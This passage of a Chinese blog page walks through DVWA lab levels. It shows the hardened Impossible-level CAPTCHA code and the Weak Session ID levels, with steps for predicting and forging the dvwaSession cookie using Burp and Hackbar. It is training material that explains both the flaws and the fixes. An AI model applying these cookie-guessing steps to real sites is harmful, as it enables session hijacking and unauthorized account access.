+<p>更改参数g-recaptcha-response以及http包头的User-Agent：</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424110945251-1429280531.png" alt="1375459-20200424110945251-1429280531"></p>
+<h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Change' ] ) ) {
+    // Check Anti-CSRF token----token验证
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input----对输入进行过滤、转义、md5
+    $pass_new  = $_POST[ 'password_new' ];
+    $pass_new  = stripslashes( $pass_new );
+    $pass_new  = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass_new  = md5( $pass_new );
+
+    $pass_conf = $_POST[ 'password_conf' ];
+    $pass_conf = stripslashes( $pass_conf );
+    $pass_conf = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass_conf = md5( $pass_conf );
+
+    $pass_curr = $_POST[ 'password_current' ];
+    $pass_curr = stripslashes( $pass_curr );
+    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass_curr = md5( $pass_curr );
+
+    // Check CAPTCHA from 3rd party----第三方校验验证码
+    $resp = recaptcha_check_answer(
+        $_DVWA[ 'recaptcha_private_key' ],
+        $_POST['g-recaptcha-response']
+    );
+
+    // Did the CAPTCHA fail?----第一步：如果第三方校验验证码正确，进行下一步
+    if( !$resp ) {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";
+        $hide_form = false;
+        return;
+    }
+    else {
+        // Check that the current password is correct----第二步：校验当前密码是否输入正确
+        $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+        $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+        $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );
+        $data-&gt;execute();
+
+        // Do both new password match and was the current password correct?---第三步：如果新密码和确认密码相同，并且当前密码正确，进行下一步
+        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
+            // Update the database---第四步：更新密码
+            $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
+            $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );
+            $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+            $data-&gt;execute();
+
+            // Feedback for the end user - success!
+            $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+        }
+        else {
+            // Feedback for the end user - failed!
+            $html .= "&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;";
+            $hide_form = false;
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p>
+<h1 id="Weak-Session-IDs（弱会话ID）"><a href="#Weak-Session-IDs（弱会话ID）" class="headerlink" title="Weak Session IDs（弱会话ID）"></a>Weak Session IDs（弱会话ID）</h1><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\20201115163154911.jpg" alt="20201115163154911"></p>
+<h4 id="session利用实质"><a href="#session利用实质" class="headerlink" title="session利用实质"></a>session利用实质</h4><p>当用户登陆后，在服务器端就会创建一个会话（Session），接着访问页面的时候就不用登陆，只需要携带Session去访问。SessionID作为特定用户访问站点所需的唯一内容。如果能够计算或轻易猜到该SessionID，则攻击者将可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而进行其他操作,如XSS、文件上传等。</p>
+<h4 id="Session劫持"><a href="#Session劫持" class="headerlink" title="Session劫持 :"></a>Session劫持 :</h4><p>就是一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验</p>
+<h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    if (!isset ($_SESSION['last_session_id'])) {
+        $_SESSION['last_session_id'] = 0;
+    }
+    //新的session_id加一
+    $_SESSION['last_session_id']++;
+    $cookie_value = $_SESSION['last_session_id'];
+    setcookie("dvwaSession", $cookie_value);
+}
+?&gt;</code></pre>
+<p>可以看到，服务器端对sessionid的生成策略非常简单：</p>
+<p>如果用户 SESSION中的 last_session_id 不存在就设为 0，存在就直接在原来的基础上加1。</p>
+<p>这种是肯定不行的。太容易被人伪造，而且不能保证每个人的session是不一样的，容易造成冲突。</p>
+<p>点Generate，按F12查看headers信息，可以看到</p>
+<p>请求头</p>
+<p>Cookie: dvwaSession=1; security=low; PHPSESSID:”hm1dnto8dfos480282k229f3j3”</p>
+<p>响应头</p>
+<p>Set-Cookie: dvwaSession=3</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\查看session_id.png" alt="查看session_id"></p>
+<p>同样可以使用burp抓包</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\burp抓cookie.png" alt="burp抓cookie"></p>
+<p>然后firefox+hackbar修改cookie：</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\hackbar修改cookie.png" alt="hackbar修改cookie"></p>
+<p>没有输入用户名密码，直接进来，也就是说我们只要猜到sessionID，就一直绕过用户名密码</p>
+<h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    $cookie_value = time();
+    setcookie("dvwaSession", $cookie_value);
+}
+?&gt;</code></pre>
+<p>从服务器端的代码来看，将SessionID的值改成了服务器的当前时间，看起来比low的随机了点，但是经过连续的收集后就很容易发现其中的规律。知道时间那我们就可以骗A在某个时间点进行点击，然后你在一个大概的范围去试试。</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\抓包.png" alt="抓包"></p>
+<p>dvwaSession=1615022375; security=medium; PHPSESSID=hm1dnto8dfos480282k229f3j3</p>
+<p>在另一个浏览器上访问这个网址，抓包，添加Cookie如下</p>
+<p>dvwaSession=1615022400; security=medium; PHPSESSID=hm1dnto8dfos480282k229f3j3</p>
+<p>使用时间戳在线查询工具就可以伪造啦</p>
+<p><a target="_blank" rel="noopener" href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
+<h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    if (!isset ($_SESSION['last_session_id_high'])) {
+        $_SESSION['last_session_id_high'] = 0;
+    }
+    $_SESSION['last_session_id_high']++;
+    $cookie_value = md5($_SESSION['last_session_id_high']);
+    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
+}
+
+?&gt;</code></pre>
+<p>这里将dvwaSession的值进行了md5计算，并且还设置了dvwaSession的有效期进一步增加安全性，但不足的是本级与低级代码一样，都是通过0开始累加的，若有经验的人在多次尝试后，很容易看出来其中的规律。</p>
+<p>![weakid high 抓包](D:\blog\source_posts\DVWA\weakid high 抓包.png)</p>
+<p>32位字符。由0-9和a-f组成猜想应该是MD5，拿到网站去解密，为2，再测试几次，发现就是如low一样从0开始每次加1，然后经过MD5加密，作为SessionID。依旧在另一个浏览器上访问这个网址，抓包，添加上Cookie。成功访问。</p>
+<h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    $cookie_value = sha1(mt_rand() . time() . "Impossible");
+    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
+}
+?&gt;</code></pre>
+<p>Impossible级别使用随机数+时间戳+固定字符串（”Impossible”）进行 sha1 运算，作为 session id，几乎不可能被破解。</p>
+<p>而 tomcat 的 session id 值生成的策略，是一个随机数+时间+ jvm 的id值（jvm的id值会根据服务器的硬件信息计算得来），如果出现冲突就会再生成一个。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Brute-Force"><span class="toc-number">1.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low"><span class="toc-number">1.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9Aburp%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">法一：burp爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8A%93%E5%8C%85"><span class="toc-number">1.1.0.1.1.</span> <span class="toc-text">1.抓包</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-ctrl-I%E5%B0%86%E5%8C%85%E5%A4%8D%E5%88%B6%E5%88%B0intruder%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%A6%81%E5%AF%B9password%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%EF%BC%8C%E6%89%80%E4%BB%A5%E5%9C%A8password%E5%8F%82%E6%95%B0%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%A4%E8%BE%B9%E5%8A%A0"><span class="toc-number">1.1.0.1.2.</span> <span class="toc-text">2.ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E9%80%89%E4%B8%ADPayloads%EF%BC%8C%E8%BD%BD%E5%85%A5%E5%AD%97%E5%85%B8%EF%BC%8C%E7%82%B9%E5%87%BBStart-attack%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.0.1.3.</span> <span class="toc-text">3.选中Payloads，载入字典，点击Start attack进行爆破</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%9C%80%E5%90%8E%EF%BC%8C%E5%B0%9D%E8%AF%95%E5%9C%A8%E7%88%86%E7%A0%B4%E7%BB%93%E6%9E%9C%E4%B8%AD%E6%89%BE%E5%88%B0%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0password%E7%9A%84%E5%93%8D%E5%BA%94%E5%8C%85%E9%95%BF%E5%BA%A6%EF%BC%88length%EF%BC%89%E2%80%9C%E4%B8%8E%E4%BC%97%E4%B8%8D%E5%90%8C%E2%80%9D%EF%BC%8C%E5%8F%AF%E6%8E%A8%E6%B5%8Bpassword%E4%B8%BA%E6%AD%A3%E7%A1%AE%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%8B%E5%B7%A5%E9%AA%8C%E8%AF%81%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F%E3%80%82"><span class="toc-number">1.1.0.1.4.</span> <span class="toc-text">4.最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9ASQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">法二：SQL注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium"><span class="toc-number">1.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#burp%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">burp爆破</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High"><span class="toc-number">1.3.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stripslashes"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">stripslashes()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-real-escape-string"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">mysql_real_escape_string()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2%E4%BD%BF%E7%94%A8%E4%BA%86sleep-rand-0-3-%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%BD%93%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%E9%94%99%E8%AF%AF%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E6%88%96%E5%AF%86%E7%A0%81%E6%97%B6%EF%BC%8C%E4%BC%9A%E9%9A%8F%E6%9C%BA%E7%AD%89%E5%BE%850-3%E7%A7%92%E5%90%8E%E6%89%8D%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E3%80%82%E9%99%8D%E4%BD%8E%E4%BA%86%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%95%88%E7%8E%87%E3%80%82"><span class="toc-number">1.3.0.2.1.</span> <span class="toc-text">错误页面使用了sleep( rand( 0, 3 ) );，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%87%E7%94%A8burp%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">采用burp爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8A%93%E5%8C%85%EF%BC%8C%E5%8F%91%E9%80%81%E5%88%B0Intruder%E6%A8%A1%E5%9D%97"><span class="toc-number">1.3.0.3.1.</span> <span class="toc-text">1.抓包，发送到Intruder模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E9%80%89%E6%8B%A9Pitchfork-%E8%8D%89%E5%8F%89%E6%A8%A1%E5%BC%8F-%EF%BC%8C%E6%B7%BB%E5%8A%A0%E7%88%86%E7%A0%B4%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">1.3.0.3.2.</span> <span class="toc-text">2.选择Pitchfork(草叉模式)，添加爆破的参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%9C%A8Options%E4%B8%AD%E6%89%BE%E5%88%B0Request-Engine%E6%A8%A1%E5%9D%97%EF%BC%8C%E6%8A%8A%E7%BA%BF%E7%A8%8B%E6%95%B0%E8%AE%BE%E4%B8%BA1"><span class="toc-number">1.3.0.3.3.</span> <span class="toc-text">3.在Options中找到Request Engine模块，把线程数设为1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%9C%A8Options%E4%B8%AD%E6%89%BE%E5%88%B0Rediections%E6%A8%A1%E5%9D%97%EF%BC%8C%E9%80%89%E6%8B%A9always%EF%BC%8C%E5%85%81%E8%AE%B8%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.3.0.3.4.</span> <span class="toc-text">4.在Options中找到Rediections模块，选择always，允许重定向</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%9C%A8Options%E4%B8%AD%E6%89%BE%E5%88%B0Grep-Extract%E6%A8%A1%E5%9D%97%EF%BC%8C%E7%82%B9%E5%87%BBAdd%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AE%E7%AD%9B%E9%80%89%E6%9D%A1%E4%BB%B6%EF%BC%8C%E5%BE%97%E5%88%B0user-token"><span class="toc-number">1.3.0.3.5.</span> <span class="toc-text">5.在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%9C%A8Payloads%E4%B8%AD%E4%B8%BA%E9%80%89%E6%8B%A9%E7%9A%84%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE%E5%AD%97%E5%85%B8"><span class="toc-number">1.3.0.3.6.</span> <span class="toc-text">6.在Payloads中为选择的参数设置字典</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E7%82%B9%E5%87%BBstart-attack%EF%BC%8C%E5%BC%80%E5%A7%8B%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.0.3.7.</span> <span class="toc-text">7.点击start attack，开始爆破</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E8%BF%94%E5%9B%9E%E9%95%BF%E5%BA%A6%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E6%AD%A3%E7%A1%AE%E7%9A%84%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.0.3.8.</span> <span class="toc-text">根据返回长度的大小，可以得到正确的用户密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible"><span class="toc-number">1.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-Injection%EF%BC%88%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">Command Injection（命令注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-1"><span class="toc-number">2.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-1"><span class="toc-number">2.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#str-replace-find-replace-string"><span class="toc-number">2.2.1.</span> <span class="toc-text">str_replace(find,replace,string)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DOS%E4%B8%AD-amp-%E7%94%A8%E6%B3%95"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">DOS中&amp;用法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-1"><span class="toc-number">2.3.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8trim-%E5%87%BD%E6%95%B0%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%8C%E5%9B%A0%E4%B8%BA-trim-str-%E5%8F%AF%E4%BB%A5%E5%88%A0%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B7%A6%E5%8F%B3%E4%B8%A4%E8%BE%B9%E7%9A%84%E7%A9%BA%E6%A0%BC%E3%80%82"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">可用trim()函数解决这个问题，因为 trim(str) 可以删除字符串左右两边的空格。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-1"><span class="toc-number">2.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">CSRF（跨站请求伪造）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8Bcsrf%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">检测csrf的方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-burp%E6%8A%93%E5%8C%85"><span class="toc-number">3.0.1.0.1.</span> <span class="toc-text">1.burp抓包</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8F%B3%E9%94%AE%E5%B7%A5%E5%85%B7%E4%B8%AD%E4%BD%BF%E7%94%A8csrf-poc%E5%B7%A5%E5%85%B7"><span class="toc-number">3.0.1.0.2.</span> <span class="toc-text">2.右键工具中使用csrf poc工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%9B%E9%80%A0%E7%AB%99%E7%82%B9"><span class="toc-number">3.0.1.0.3.</span> <span class="toc-text">3.创造站点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E8%AE%BF%E9%97%AE%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">3.0.1.0.4.</span> <span class="toc-text">4.访问浏览器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%87%BA%E7%8E%B0%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E5%AD%98%E5%9C%A8csrf"><span class="toc-number">3.0.1.0.5.</span> <span class="toc-text">5.出现密码修改存在csrf</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-2"><span class="toc-number">3.1.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stripos-string-find-start"><span class="toc-number">3.1.1.</span> <span class="toc-text">stripos(string,find,start)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-2"><span class="toc-number">3.2.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-2"><span class="toc-number">3.3.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">File Inclusion（文件包含）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-2"><span class="toc-number">4.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.1.0.1.</span> <span class="toc-text">1、本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.1.0.2.</span> <span class="toc-text">2、远程文件包含</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-3"><span class="toc-number">4.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1"><span class="toc-number">4.2.0.1.</span> <span class="toc-text">1、本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1"><span class="toc-number">4.2.0.2.</span> <span class="toc-text">2、远程文件包含</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-3"><span class="toc-number">4.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-3"><span class="toc-number">4.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Insecure-CAPTCHA%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">Insecure CAPTCHA（不安全的验证码&#x2F;不安全的验证流程）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reCAPTCHA%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">5.0.0.1.</span> <span class="toc-text">reCAPTCHA验证流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-3"><span class="toc-number">5.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-4"><span class="toc-number">5.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-4"><span class="toc-number">5.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-4"><span class="toc-number">5.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Weak-Session-IDs%EF%BC%88%E5%BC%B1%E4%BC%9A%E8%AF%9DID%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">Weak Session IDs（弱会话ID）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E5%88%A9%E7%94%A8%E5%AE%9E%E8%B4%A8"><span class="toc-number">6.0.0.1.</span> <span class="toc-text">session利用实质</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%E5%8A%AB%E6%8C%81"><span class="toc-number">6.0.0.2.</span> <span class="toc-text">Session劫持 :</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-4"><span class="toc-number">6.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-5"><span class="toc-number">6.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-5"><span class="toc-number">6.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-5"><span class="toc-number">6.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
